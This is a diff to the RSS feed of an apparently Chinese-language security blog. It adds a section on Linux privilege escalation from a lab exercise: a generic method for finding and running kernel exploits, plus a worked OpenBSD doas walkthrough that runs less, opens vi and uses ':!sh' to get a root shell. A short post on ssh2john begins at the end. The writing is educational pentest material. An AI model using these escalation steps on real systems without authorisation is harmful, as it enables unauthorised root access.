@@ -1593,7 +1593,58 @@
 </span></span><span style="display:flex;"><span>root
 </span></span></code></pre></div><p>因为我们在 kali 中是 root，所以执行的命令映射到靶机中也是 root，以 root 身份执行了 <code>/bin/bash -p</code> 获得 root 权限。</p>
 <h3 id="内核提权">内核提权</h3>
-<p>可以参考我的文章 <a href="https://enilmalus.github.io/posts/lampiao-writeup/">Lampiao Writeup</a></p>
+<p>可以参考我的文章 <a href="https://enilmalus.github.io/posts/lampiao-writeup/">Lampiao Writeup</a>。</p>
+<p>Linux 内核负责管理系统内存和应用程序等组件之间的通信。这个关键功能要求内核具有特定权限；因此，成功的漏洞利用可能会导致获得 root 权限。内核漏洞利用方法很简单：</p>
+<ol>
+<li>确定内核版本</li>
+<li>为目标系统的内核版本搜索并找到一个漏洞利用代码</li>
+<li>运用漏洞利用</li>
+</ol>
+<p>注意，失败的内核漏洞利用可能会导致系统崩溃。在尝试内核漏洞利用之前，请确保这种潜在的结果在渗透测试范围内是可接受的。内核漏洞利用往往是攻击者采取的最后一步，因为有时它们更容易被发现引起蓝队的警觉。</p>
+<p>内核版本确定后可以通过 <code>github</code>、<code>searchsploit</code>、<code>Google</code> 搜索公开漏洞利用代码。</p>
+<p>一些技巧和经验：</p>
+<ol>
+<li>使用 <code>cat /proc/version</code> 或 <code>uname -a</code> 获得内核版本后，在搜索利用是不必过于具体地指定内核版本，宽严并用。</li>
+<li>使用漏洞利用代码之前确保了解其工作原理，一些漏洞利用代码可能会在操作系统上进行更改，导致进一步使用中变得不安全，或者对系统进行不可逆地更改，从而在后期产生问题。</li>
+<li>一些漏洞利用可能在运行后需要进一步互动。要阅读漏洞利用代码、附带地说明和社区评论。</li>
+</ol>
+<h3 id="doas-lessvi-提权">doas less+vi 提权</h3>
+<p>查看具有 s 位的可执行文件发现有 <code>/usr/bin/doas</code>，查看他的配置文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Enilmalus$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null /usr/bin/chfn 
+</span></span><span style="display:flex;"><span>/usr/bin/chpass 
+</span></span><span style="display:flex;"><span>/usr/bin/chsh 
+</span></span><span style="display:flex;"><span>/usr/bin/doas 
+</span></span><span style="display:flex;"><span>/usr/bin/lpr 
+</span></span><span style="display:flex;"><span>/usr/bin/lprm 
+</span></span><span style="display:flex;"><span>/usr/bin/passwd 
+</span></span><span style="display:flex;"><span>/usr/bin/su 
+</span></span><span style="display:flex;"><span>/usr/libexec/lockspool 
+</span></span><span style="display:flex;"><span>/usr/libexec/ssh-keysign 
+</span></span><span style="display:flex;"><span>/usr/sbin/authpf 
+</span></span><span style="display:flex;"><span>/usr/sbin/authpf-noip 
+</span></span><span style="display:flex;"><span>/usr/sbin/pppd 
+</span></span><span style="display:flex;"><span>/usr/sbin/traceroute 
+</span></span><span style="display:flex;"><span>/usr/sbin/traceroute6 
+</span></span><span style="display:flex;"><span>/sbin/ping 
+</span></span><span style="display:flex;"><span>/sbin/ping6 
+</span></span><span style="display:flex;"><span>/sbin/shutdown
+</span></span><span style="display:flex;"><span>Enilmalus$ cat /etc/doas.conf 
+</span></span><span style="display:flex;"><span>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog 
+</span></span><span style="display:flex;"><span>permit nopass keepenv root as root
+</span></span></code></pre></div><p>根据提示执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>doas /usr/bin/less /var/log/authlog
+</span></span></code></pre></div><p>在 less 中按 v 启动 vi 编辑状态，然后执行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>:!sh
+</span></span></code></pre></div><p>获得 root。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Enilmalus# whoami 
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>OpenBSD 是一个基于 Berkeley Software Distribution（BSD）的开源操作系统，强调正确性、简单性和安全性。这个系统中的 doas 是一个命令行工具，设计用来提供超级用户权限。doas 的配置文件默认位 /etc/doas.conf。此配置规定了哪些用户可以使用 doas 命令以及它们可执行的命令范围。</p>
+<p>下面为 doas.conf 可能的文件条目：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>permit keepenv :wheel
+</span></span></code></pre></div><p>这个条目允许 wheel 的所哟成员使用 doas 命令执行任何操作并保留他们的环境变量。</p>
+<p>doas.conf 文件的每一行代表一个规则，这些规则按照文件中的顺序进行处理。一旦找到一个匹配的规则则会停止搜索，使用具有最大限制的规则通常会放在文件顶部。例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>permit nopass enil as root cmd reboot
+</span></span></code></pre></div><p>这个规则允许用户 enil 不需要密码作为 root 用户允许 reboot 命令。</p>
 ]]></content></item><item><title>John 工作原理分析</title><link>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</link><pubDate>Thu, 01 Jan 2026 00:40:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/john-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</guid><description>&lt;h2 id="ssh2john-提取私钥"&gt;ssh2john 提取私钥&lt;/h2&gt;
 &lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ ssh2john id_rsa | tee key_hash
